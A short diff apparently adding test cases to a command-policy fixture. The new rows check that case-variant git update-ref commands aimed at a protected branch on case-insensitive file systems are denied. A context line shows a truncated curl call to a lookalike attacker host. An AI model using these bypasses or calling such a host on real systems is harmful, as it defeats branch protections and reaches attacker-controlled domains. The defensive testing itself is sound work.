@@ -1327,6 +1327,8 @@ Fs | feat/x | shell | silent | curl https://api.github.com.evil.example/repos/o/
 
 # --- F18: on a file system that ignores case the ref of the protected branch is one file under every spelling
 #     (measured, git 2.55 on APFS: `git update-ref refs/heads/Main` and `REFS/HEADS/MAIN` move main)
+F18 | feat/x | protected-branch | deny | git update-ref refs/heads/Main abc123
+F18 | feat/x | protected-branch | deny | git update-ref REFS/HEADS/MAIN abc123
 Fs | feat/x | protected-branch | deny | git update-ref refs/heads/main abc123
 Fs | feat/x | shell | silent | git update-ref refs/heads/feature abc123
 Fs | feat/x | shell | silent | git update-ref refs/tags/v1 abc123
